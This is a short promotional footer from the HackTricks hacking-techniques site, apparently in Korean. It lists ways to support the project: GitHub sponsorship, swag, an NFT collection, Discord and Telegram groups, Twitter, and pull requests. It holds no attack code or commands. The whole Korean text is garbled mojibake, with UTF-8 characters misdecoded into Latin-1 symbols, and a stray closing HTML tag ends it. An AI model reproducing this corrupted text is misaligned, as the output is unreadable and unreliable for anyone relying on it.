HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ ìš”ë ¹ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
